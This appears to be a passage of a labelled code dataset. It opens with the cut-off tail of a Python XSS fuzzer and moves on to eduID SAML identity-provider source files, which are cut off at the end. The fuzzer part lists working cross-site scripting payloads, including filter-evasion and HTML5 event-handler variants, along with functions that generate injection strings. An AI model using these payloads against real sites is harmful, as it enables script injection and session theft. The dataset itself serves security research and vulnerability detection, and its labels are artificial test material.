oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n/n/n/n", "label": 1}, {"id": "e106ab1a6491342c9084772fba9f5c7b29be8d65", "code": "setup.py/n/n#!/usr/bin/env python\n#\nfrom setuptools import setup, find_packages\nimport sys, os\nfrom distutils import versionpredicate\n\nhere = os.path.abspath(os.path.dirname(__file__))\nREADME = open(os.path.join(here, 'README')).read()\n\nversion = '0.3.23b0'\n\ninstall_requires = [\n    'pymongo>=2.8,<3',\n    'pysaml2==1.2.0beta5',\n    'python-memcached==1.53',\n    'cherrypy==3.2.4',\n    'vccs_client==0.4.1',\n    'eduid_am>=0.5.3',\n]\n\ntesting_extras = [\n    'nose==1.2.1',\n    'coverage==3.6',\n]\n\nsetup(name='eduid_idp',\n      version=version,\n      description=\"eduID SAML frontend IdP\",\n      long_description=README,\n      classifiers=[\n        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        ],\n      keywords='eduID SAML',\n      author='Fredrik Thulin',\n      author_email='fredrik@thulin.net',\n      license='BSD',\n      packages=['eduid_idp',],\n      package_dir = {'': 'src'},\n      #include_package_data=True,\n      #package_data = { },\n      zip_safe=False,\n      install_requires=install_requires,\n      extras_require={\n        'testing': testing_extras,\n        },\n      entry_points={\n        'console_scripts': ['eduid_idp=eduid_idp.idp:main',\n                            ]\n        }\n      )\n/n/n/nsrc/eduid_idp/config.py/n/n#\n# Copyright (c) 2013, 2014 NORDUnet A/S\n# All rights reserved.\n#\n#   Redistribution and use in source and binary forms, with or\n#   without modification, are permitted provided that the following\n#   conditions are met:\n#\n#     1. Redistributions of source code must retain the above copyright\n#        notice, this list of conditions and the following disclaimer.\n#     2. Redistributions in binary form must reproduce the above\n#        copyright notice, this list of conditions and the following\n#        disclaimer in the documentation and/or other materials provided\n#        with the distribution.\n#     3. Neither the name of the NORDUnet nor the names of its\n#        contributors may be used to endorse or promote products derived\n#        from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n#\n# Author : Fredrik Thulin <fredrik@thulin.net>\n#\n\"\"\"\nConfiguration (file) handling for eduID IdP.\n\"\"\"\n\nimport os\nimport ConfigParser\n\n_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()\n                    'syslog_debug': '0',              # '1' for True, '0' for False\n                    'num_threads': '8',\n                    'logdir': None,\n                    'logfile': None,\n                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)\n                    'listen_addr': '0.0.0.0',\n                    'listen_port': '8088',\n                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()\n                    'fticks_secret_key': None,\n                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',\n                    'static_dir': None,\n                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters\n                    'server_cert': None,  # SSL cert filename\n                    'server_key': None,   # SSL key filename\n                    'cert_chain': None,   # SSL certificate chain filename, or None\n                    'userdb_mongo_uri': None,\n                    'userdb_mongo_database': None,\n                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes\n                    'sso_session_mongo_uri': None,\n                    'raven_dsn': None,\n                    'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                    'verify_request_signatures': '0',  # '1' for True, '0' for False\n                    'status_test_usernames': [],\n                    'signup_link': '#',         # for login.html\n                    'dashboard_link': '#',      # for forbidden.html\n                    'password_reset_link': '#', # for login.html\n                    'default_language': 'en',\n                    'base_url': None,\n                    'default_eppn_scope': None,\n                    'authn_info_mongo_uri': None,\n                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100\n                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                    'default_scoped_affiliation': None,\n                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL\n                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag\n                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities.\n                    }\n\n_CONFIG_SECTION = 'eduid_idp'\n\n\nclass IdPConfig(object):\n\n    \"\"\"\n    Class holding IdP application configuration.\n\n    Loads configuration from an INI-file at instantiation.\n\n    :param filename: string, INI-file name\n    :param debug: boolean, default debug value\n    :raise ValueError: if INI-file can't be parsed\n    \"\"\"\n\n    def __init__(self, filename, debug):\n        self._parsed_content_packages = None\n        self._parsed_status_test_usernames = None\n        self.section = _CONFIG_SECTION\n        _CONFIG_DEFAULTS['debug'] = str(debug)\n        cfgdir = os.path.dirname(filename)\n        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])\n        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)\n        if not self.config.read([filename]):\n            raise ValueError(\"Failed loading config file {!r}\".format(filename))\n\n    @property\n    def num_threads(self):\n        \"\"\"\n        Number of worker threads to start (integer).\n\n        EduID IdP spawns multiple threads to make use of all CPU cores in the password\n        pre-hash function.\n        Number of threads should probably be about 2x number of cores to 4x number of\n        cores (if hyperthreading is available).\n        \"\"\"\n        return self.config.getint(self.section, 'num_threads')\n\n    @property\n    def logdir(self):\n        \"\"\"\n        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logdir')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def logfile(self):\n        \"\"\"\n        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logfile')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def syslog_socket(self):\n        \"\"\"\n        Syslog socket to log to (string). Something like '/dev/log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'syslog_socket')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def debug(self):\n        \"\"\"\n        Set to True to log debug messages (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'debug')\n\n    @property\n    def syslog_debug(self):\n        \"\"\"\n        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'syslog_debug')\n\n    @property\n    def listen_addr(self):\n        \"\"\"\n        IP address to listen on.\n        \"\"\"\n        return self.config.get(self.section, 'listen_addr')\n\n    @property\n    def listen_port(self):\n        \"\"\"\n        The port the IdP authentication should listen on (integer).\n        \"\"\"\n        return self.config.getint(self.section, 'listen_port')\n\n    @property\n    def pysaml2_config(self):\n        \"\"\"\n        pysaml2 configuration file. Separate config file with SAML related parameters.\n        \"\"\"\n        return self.config.get(self.section, 'pysaml2_config')\n\n    @property\n    def fticks_secret_key(self):\n        \"\"\"\n        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data\n        on every login.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_secret_key')\n\n    @property\n    def fticks_format_string(self):\n        \"\"\"\n        Get SAML F-TICKS format string.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_format_string')\n\n    @property\n    def static_dir(self):\n        \"\"\"\n        Directory with static files to be served.\n        \"\"\"\n        return self.config.get(self.section, 'static_dir')\n\n    @property\n    def ssl_adapter(self):\n        \"\"\"\n        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)\n        \"\"\"\n        return self.config.get(self.section, 'ssl_adapter')\n\n    @property\n    def server_cert(self):\n        \"\"\"\n        SSL certificate filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_cert')\n\n    @property\n    def server_key(self):\n        \"\"\"\n        SSL private key filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_key')\n\n    @property\n    def cert_chain(self):\n        \"\"\"\n        SSL certificate chain filename\n        \"\"\"\n        return self.config.get(self.section, 'cert_chain')\n\n    @property\n    def userdb_mongo_uri(self):\n        \"\"\"\n        UserDB MongoDB connection URI (string). See MongoDB documentation for details.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_uri')\n\n    @property\n    def userdb_mongo_database(self):\n        \"\"\"\n        UserDB database name.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_database')\n\n    @property\n    def sso_session_lifetime(self):\n        \"\"\"\n        Lifetime of SSO session (in minutes).\n\n        If a user has an active SSO session, they will get SAML assertions made\n        without having to authenticate again (unless SP requires it through\n        ForceAuthn).\n\n        The total time a user can access a particular SP would therefor be\n        this value, plus the pysaml2 lifetime of the assertion.\n        \"\"\"\n        return self.config.getint(self.section, 'sso_session_lifetime')\n\n    @property\n    def sso_session_mongo_uri(self):\n        \"\"\"\n        SSO session MongoDB connection URI (string). See MongoDB documentation for details.\n\n        If not set, an in-memory SSO session cache will be used.\n        \"\"\"\n        return self.config.get(self.section, 'sso_session_mongo_uri')\n\n    @property\n    def raven_dsn(self):\n        \"\"\"\n        Raven DSN (string) for logging exceptions to Sentry.\n        \"\"\"\n        return self.config.get(self.section, 'raven_dsn')\n\n    @property\n    def content_packages(self):\n        \"\"\"\n        Get list of tuples with packages and paths to content resources, such as login.html.\n\n        The expected format in the INI file is\n\n            content_packages = pkg1:some/path/, pkg2:foo\n\n        :return: list of (pkg, path) tuples\n        \"\"\"\n        if self._parsed_content_packages:\n            return self._parsed_content_packages\n        value = self.config.get(self.section, 'content_packages')\n        res = []\n        for this in value.split(','):\n            this = this.strip()\n            name, _sep, path, = this.partition(':')\n            res.append((name, path))\n        self._parsed_content_packages = res\n        return res\n\n    @property\n    def verify_request_signatures(self):\n        \"\"\"\n        Verify request signatures, if they exist.\n\n        This defaults to False since it is a trivial DoS to consume all the IdP:s\n        CPU resources if this is set to True.\n        \"\"\"\n        res = self.config.get(self.section, 'verify_request_signatures')\n        return bool(int(res))\n\n    @property\n    def status_test_usernames(self):\n        \"\"\"\n        Get list of usernames valid for use with the /status URL.\n\n        If this list is ['*'], all usernames are allowed for /status.\n\n        :return: list of usernames\n\n        :rtype: list[string]\n        \"\"\"\n        if self._parsed_status_test_usernames:\n            return self._parsed_status_test_usernames\n        value = self.config.get(self.section, 'status_test_usernames')\n        res = [x.strip() for x in value.split(',')]\n        self._parsed_status_test_usernames = res\n        return res\n\n    @property\n    def signup_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'signup_link')\n\n    @property\n    def dashboard_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of forbidden.html.\n        \"\"\"\n        return self.config.get(self.section, 'dashboard_link')\n\n    @property\n    def password_reset_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'password_reset_link')\n\n    @property\n    def default_language(self):\n        \"\"\"\n        Default language code to use when looking for web pages ('en').\n        \"\"\"\n        return self.config.get(self.section, 'default_language')\n\n    @property\n    def base_url(self):\n        \"\"\"\n        Base URL of the IdP. The default base URL is constructed from the\n        Request URI, but for example if there is a load balancer/SSL\n        terminator in front of the IdP it might be required to specify\n        the URL of the service.\n        \"\"\"\n        return self.config.get(self.section, 'base_url')\n\n    @property\n    def default_eppn_scope(self):\n        \"\"\"\n        The scope to append to any unscoped eduPersonPrincipalName\n        attributes found on users in the userdb.\n        \"\"\"\n        return self.config.get(self.section, 'default_eppn_scope')\n\n    @property\n    def authn_info_mongo_uri(self):\n        \"\"\"\n        Authn info (failed logins etc.) MongoDB connection URI (string).\n        See MongoDB documentation for details.\n\n        If not set, Kantara authn logs will not be maintained.\n        \"\"\"\n        return self.config.get(self.section, 'authn_info_mongo_uri')\n\n    @property\n    def max_authn_failures_per_month(self):\n        \"\"\"\n        Disallow login for a user after N failures in a given month.\n\n        This is said to be an imminent Kantara requirement.\n        \"\"\"\n        return self.config.getint(self.section, 'max_authn_failures_per_month')\n\n    @property\n    def login_state_ttl(self):\n        \"\"\"\n        Lifetime of state kept in IdP login phase.\n\n        This is the time, in minutes, a user has to complete the login phase.\n        After this time, login cannot complete because the SAMLRequest, RelayState\n        and possibly other needed information will be forgotten.\n        \"\"\"\n        return self.config.getint(self.section, 'login_state_ttl')\n\n    @property\n    def default_scoped_affiliation(self):\n        \"\"\"\n        Add a default eduPersonScopedAffiliation if none is returned from the\n        attribute manager.\n        \"\"\"\n        return self.config.get(self.section, 'default_scoped_affiliation')\n\n    @property\n    def vccs_url(self):\n        \"\"\"\n        URL to use with VCCS client. BCP is to have an nginx or similar on\n        localhost that will proxy requests to a currently available backend\n        using TLS.\n        \"\"\"\n        return self.config.get(self.section, 'vccs_url')\n\n    @property\n    def insecure_cookies(self):\n        \"\"\"\n        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'insecure_cookies')\n\n    @property\n    def httponly_cookies(self):\n        \"\"\"\n        Set to False to NOT set HTTP Cookie 'httponly' flag (boolean).\n\n        This flag protects against common cross-site scripting (XSS) by\n        not allowing client side scripts e.g. JavaScript to access cookies.\n        \"\"\"\n        return self.config.getboolean(self.section, 'httponly_cookies')\n/n/n/nsrc/eduid_idp/mischttp.py/n/n#\n# Copyright (c) 2013 NORDUnet A/S\n# Copyright 2012 Roland Hedberg. All rights reserved.\n# All rights reserved.\n#\n# See the file eduid-IdP/LICENSE.txt for license statement.\n#\n# Author : Fredrik Thulin <fredrik@thulin.net>\n#          Roland Hedberg\n#\n\n\"\"\"\nMiscellaneous HTTP related functions.\n\"\"\"\n\nimport os\nimport re\nimport base64\nimport pprint\nimport cherrypy\nimport pkg_resources\n\nfrom urlparse import parse_qs\n\nimport eduid_idp\n\nfrom saml2 import BINDING_HTTP_REDIRECT\n\n\nclass Redirect(cherrypy.HTTPRedirect):\n    \"\"\"\n    Class 'copy' just to avoid having references to CherryPy in other modules.\n    \"\"\"\n    pass\n\n\ndef create_html_response(binding, http_args, start_response, logger):\n    \"\"\"\n    Create a HTML response based on parameters compiled by pysaml2 functions\n    like apply_binding().\n\n    :param binding: SAML binding\n    :param http_args: response data\n    :param start_response: WSGI-like start_response function\n    :param logger: logging logger\n\n    :return: HTML response\n\n    :type binding: string\n    :type http_args: dict\n    :type start_response: function\n    :type logger: logging.Logger\n    :rtype: string\n    \"\"\"\n    if binding == BINDING_HTTP_REDIRECT:\n        # XXX This URL extraction code is untested in practice, but it appears\n        # the should be HTTP headers in http_args['headers']\n        urls = [v for (k, v) in http_args['headers'] if k == 'Location']\n        logger.debug('Binding {!r} redirecting to {!r}'.format(binding, urls))\n        if 'url' in http_args:\n            del http_args['headers']  # less debug log below\n            logger.debug('XXX there is also a \"url\" in http_args :\\n{!s}'.format(pprint.pformat(http_args)))\n            if not urls:\n                urls = [http_args.get('url')]\n        raise cherrypy.HTTPRedirect(urls)\n\n    # Parse the parts of http_args we know how to parse, and then warn about any remains.\n    message = http_args.pop('data')\n    status = http_args.pop('status', '200 Ok')\n    headers = http_args.pop('headers', [])\n    headers_lc = [x[0].lower() for x in headers]\n    if 'content-type' not in headers_lc:\n        _content_type = http_args.pop('content', 'text/html')\n        headers.append(('Content-Type', _content_type))\n\n    if http_args != {}:\n        logger.debug('Unknown HTTP args when creating {!r} response :\\n{!s}'.format(\n            status, pprint.pformat(http_args)))\n\n    start_response(status, headers)\n    return message\n\n\ndef geturl(config, query = True, path = True):\n    \"\"\"Rebuilds a request URL (from PEP 333).\n\n    :param config: IdP config\n    :param query: Is QUERY_STRING included in URI (default: True)\n    :param path: Is path included in URI (default: True)\n\n    :type config: eduid_idp.config.IdPConfig\n    \"\"\"\n    url = [config.base_url]\n    if not url[0]:\n        # For some reason, cherrypy.request.base always have host 127.0.0.1 -\n        # work around that with much more elaborate code, based on pysaml2.\n        #return cherrypy.request.base + cherrypy.request.path_info\n        url = [cherrypy.request.scheme, '://',\n               cherrypy.request.headers['Host'], ':',\n               str(cherrypy.request.local.port), '/']\n    if path:\n        url.append(cherrypy.request.path_info.lstrip('/'))\n    if query:\n        url.append('?' + cherrypy.request.query_string)\n    return ''.join(url)\n\n\ndef get_post():\n    \"\"\"\n    Return the parsed query string equivalent from a HTML POST request.\n\n    When the method is POST the query string will be sent in the HTTP request body.\n\n    :return: query string\n\n    :rtype: dict\n    \"\"\"\n    return cherrypy.request.body_params\n\n\ndef get_request_header():\n    \"\"\"\n    Return the HTML request headers..\n\n    :return: headers\n\n    :rtype: dict\n    \"\"\"\n    return cherrypy.request.headers\n\n\ndef get_request_body():\n    \"\"\"\n    Return the request body from a HTML POST request.\n\n    :return: raw body\n\n    :rtype: string\n    \"\"\"\n    length = cherrypy.request.headers.get('Content-Length', 0)\n    if not length:\n        # CherryPy 3.2.4 seems to not like length 0 in the read() below\n        return ''\n    raw_body = cherrypy.request.body.read(int(length))\n    return raw_body\n\n\ndef static_filename(config, path):\n    \"\"\"\n    Check if there is a static file matching 'path'.\n\n    :param config: IdP config\n    :param path: URL part to check\n    :return: False, None or filename as string\n\n    :type config: eduid_idp.config.IdPConfig\n    :type path: string\n    :rtype: False | None | string\n    \"\"\"\n    if not isinstance(path, basestring):\n        return False\n    if not config.static_dir:\n        return False\n    try:\n        filename = os.path.join(config.static_dir, path)\n        os.stat(filename)\n        return filename\n    except OSError:\n        return None\n\n\ndef static_file(start_response, filename, logger, fp=None, status=None):\n    \"\"\"\n    Serve a static file, 'known' to exist.\n\n    :param start_response: WSGI-like start_response function\n    :param filename: OS path to the files whose content should be served\n    :param logger: Logging logger\n    :param fp: optional file-like object implementing read()\n    :param status: optional HTML result data ('404 Not Found' for example)\n    :return: file content\n\n    :type start_response: function\n    :type filename: string\n    :type logger: logging.Logger\n    :type fp: File\n    :type status: string\n    :rtype: string\n    \"\"\"\n    content_type = get_content_type(filename)\n    if not content_type:\n        logger.error(\"Could not determine content type for static file {!r}\".format(filename))\n        raise eduid_idp.error.NotFound()\n\n    if not status:\n        status = '200 Ok'\n\n    try:\n        if not fp:\n            fp = open(filename)\n        text = fp.read()\n    except IOError:\n        raise eduid_idp.error.NotFound()\n    finally:\n        fp.close()\n\n    logger.debug(\"Serving {!s}, status={!r} content-type {!s}, length={!r}\".format(\n        filename, status, content_type, len(text)))\n\n    start_response(status, [('Content-Type', content_type)])\n    return text\n\n\ndef get_content_type(filename):\n    \"\"\"\n    Figure out the content type to use from a filename.\n\n    :param filename: string\n    :return: string like 'text/html'\n\n    :type filename: string\n    :rtype: string\n    \"\"\"\n    types = {'ico': 'image/x-icon',\n             'png': 'image/png',\n             'html': 'text/html',\n             'css': 'text/css',\n             'js': 'application/javascript',\n             'txt': 'text/plain',\n             'xml': 'text/xml',\n             'svg': 'image/svg+xml',\n             'woff': 'application/font-woff',\n             'eot': 'application/vnd.ms-fontobject',\n             'ttf': 'application/x-font-ttf',\n             }\n    ext = filename.rsplit('.', 1)[-1]\n    if ext not in types:\n        return None\n    return types[ext]\n\n\n# ----------------------------------------------------------------------------\n# Cookie handling\n# ----------------------------------------------------------------------------\ndef read_cookie(logger):\n    \"\"\"\n    Decode information stored in a browser cookie.\n\n    The idpauthn cookie holds a value used to lookup `userdata' in IDP.cache.\n\n    :param logger: logging logger\n    :returns: string with cookie content, or None\n\n    :type logger: logging.Logger\n    :rtype: string | None\n    \"\"\"\n    cookie = cherrypy.request.cookie\n    logger.debug(\"Parsing cookie(s): {!s}\".format(cookie))\n    _authn = cookie.get(\"idpauthn\")\n    if _authn:\n        try:\n            cookie_val = base64.b64decode(_authn.value)\n            logger.debug(\"idpauthn cookie value={!r}\".format(cookie_val))\n            return cookie_val\n        except KeyError:\n            return None\n    else:\n        logger.debug(\"No idpauthn cookie\")\n    return None\n\n\ndef delete_cookie(name, logger, config):\n    \"\"\"\n    Ask browser to delete a cookie.\n\n    :param name: cookie name as string\n    :param logger: logging instance\n    :param config: IdPConfig instance\n    :return: True on success\n\n    :type name: string\n    :type logger: logging.Logger\n    :type config: eduid_idp.config.IdPConfig\n    :rtype: bool\n    \"\"\"\n    logger.debug(\"Delete cookie: {!s}\".format(name))\n    return set_cookie(name, '/', logger, config)\n\n\ndef set_cookie(name, path, logger, config, value=''):\n    \"\"\"\n    Ask browser to store a cookie.\n\n    Since eduID.se is HTTPS only, the cookie parameter `Secure' is set.\n\n    :param name: Cookie identifier (string)\n    :param path: The path specification for the cookie\n    :param logger: logging instance\n    :param config: IdPConfig instance\n    :param value: The value to assign to the cookie\n\n    :return: True on success\n\n    :type name: string\n    :type path: string\n    :type logger: logging.Logger\n    :type config: eduid_idp.config.IdPConfig\n    :type value: string\n    :rtype: bool\n    \"\"\"\n    cookie = cherrypy.response.cookie\n    cookie[name] = base64.b64encode(str(value))\n    cookie[name]['path'] = path\n    if not config.insecure_cookies:\n        cookie[name]['secure'] = True  # ask browser to only send cookie using SSL/TLS\n    if config.httponly_cookies:\n        cookie[name]['httponly'] = True # protect against common XSS vulnerabilities\n    logger.debug(\"Set cookie : {!s}\".format(cookie))\n    return True\n\n\ndef parse_query_string():\n    \"\"\"\n    Parse HTML request query string into a dict like\n\n    {'Accept': string,\n     'Host': string,\n    }\n\n    NOTE: Only the first header value for each header is included in the result.\n\n    :return: parsed query string\n\n    :rtype: dict\n    \"\"\"\n    query = None\n    if cherrypy.request.query_string:\n        _qs = cherrypy.request.query_string\n        query = dict([(k, v[0]) for k, v in parse_qs(_qs).items()])\n    return query\n\n\ndef parse_accept_lang_header(lang_string):\n    \"\"\"\n    Parses the lang_string, which is the body of an HTTP Accept-Language\n    header, and returns a list of (lang, q-value), ordered by 'q' values.\n\n    Any format errors in lang_string results in an empty list being returned.\n\n    :param lang_string: Accept-Language header\n\n    :type lang_string: string\n    :rtype: list[(string, string)]\n    \"\"\"\n    return eduid_idp.thirdparty.parse_accept_lang_header(lang_string)\n\n\ndef localized_resource(start_response, filename, config, logger=None, status=None):\n    \"\"\"\n    Locate a static page in the users preferred language. Such pages are\n    packaged in separate Python packages that allow access through\n    pkg_resource.\n\n    :param start_response: WSGI-like start_response function\n    :param filename: string, name of resource\n    :param config: IdP config instance\n    :param logger: optional logging logger, for debug log messages\n    :param status: string, optional HTML result data ('404 Not Found' for example)\n    :return: HTML response data\n\n    :type start_response: function\n    :type filename: string\n    :type config: eduid_idp.config.IdPConfig\n    :type logger: logging.Logger\n    :type status: string\n    :rtype: string\n    \"\"\"\n    _LANGUAGE_RE = re.compile(\n            r'''\n            ([A-Za-z]{1,8}(?:-[A-Za-z0-9]{1,8})*|)      # \"en\", \"en-au\", \"x-y-z\", \"es-419\", NOT the \"*\"\n            ''', re.VERBOSE)\n\n    # Look for some static page in user preferred language\n    languages = eduid_idp.mischttp.parse_accept_lang_header(cherrypy.request.headers.get('Accept-Language', ''))\n    if logger:\n        logger.debug(\"Client language preferences: {!r}\".format(languages))\n    languages = [lang for (lang, q_val) in languages[:50]]  # cap somewhere to prevent DoS\n    if not config.default_language in languages and config.default_language:\n        languages.append(config.default_language)\n\n    if languages:\n        logger.debug(\"Languages list : {!r}\".format(languages))\n        for lang in languages:\n            if _LANGUAGE_RE.match(lang):\n                for (package, path) in config.content_packages:\n                    langfile = path + '/' + lang.lower() + '/' + filename  # pkg_resources paths do not use os.path.join\n                    if logger:\n                        logger.debug('Looking for package {!r}, language {!r}, path: {!r}'.format(\n                            package, lang, langfile))\n                    try:\n                        res = pkg_resources.resource_stream(package, langfile)\n                        return eduid_idp.mischttp.static_file(start_response, langfile, logger, fp=res, status=status)\n                    except IOError:\n                        pass\n\n    # default language file\n    static_fn = eduid_idp.mischttp.static_filename(config, filename)\n    logger.debug(\"Looking for {!r} at default location (static_dir {!r}): {!r}\".format(\n        filename, config.static_dir, static_fn))\n    if not static_fn:\n        logger.warning(\"Failed locating page {!r} in an accepted language or the default location\".format(filename))\n        return None\n    logger.debug('Using default file for {!r}: {!r}'.format(filename, static_fn))\n    return eduid_idp.mischttp.static_file(start_response, static_fn, logger, status=status)\n\n\ndef get_http_method():\n    \"\"\"\n    Get the HTTP method verb for this request.\n\n    This function keeps other modules from having to know that CherryPy is used.\n\n    :return: 'GET', 'POST' or other\n    :rtype: string\n    \"\"\"\n    return cherrypy.request.method\n\n\ndef get_remote_ip():\n    \"\"\"\n    Get the remote IP address for this request.\n\n    This function keeps other modules from having to know that CherryPy is used.\n\n    :return: Client IP address\n    :rtype: string\n    \"\"\"\n    return cherrypy.request.remote.ip\n/n/n/n", "label": 0}, {"id": "e106ab1a6491342c9084772fba9f5c7b29be8d65", "code": "/setup.py/n/n#!/usr/bin/env python\n#\nfrom setuptools import setup, find_packages\nimport sys, os\nfrom distutils import versionpredicate\n\nhere = os.path.abspath(os.path.dirname(__file__))\nREADME = open(os.path.join(here, 'README')).read()\n\nversion = '0.3.22'\n\ninstall_requires = [\n    'pymongo>=2.8,<3',\n    'pysaml2==1.2.0beta5',\n    'python-memcached==1.53',\n    'cherrypy==3.2.4',\n    'vccs_client==0.4.1',\n    'eduid_am>=0.5.3',\n]\n\ntesting_extras = [\n    'nose==1.2.1',\n    'coverage==3.6',\n]\n\nsetup(name='eduid_idp',\n      version=version,\n      description=\"eduID SAML frontend IdP\",\n      long_description=README,\n      classifiers=[\n        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        ],\n      keywords='eduID SAML',\n      author='Fredrik Thulin',\n      author_email='fredrik@thulin.net',\n      license='BSD',\n      packages=['eduid_idp',],\n      package_dir = {'': 'src'},\n      #include_package_data=True,\n      #package_data = { },\n      zip_safe=False,\n      install_requires=install_requires,\n      extras_require={\n        'testing': testing_extras,\n        },\n      entry_points={\n        'console_scripts': ['eduid_idp=eduid_idp.idp:main',\n                            ]\n        }\n      )\n/n/n/n/src/eduid_idp/config.py/n/n#\n# Copyright (c) 2013, 2014 NORDUnet A/S\n# All rights reserved.\n#\n#   Redistribution and 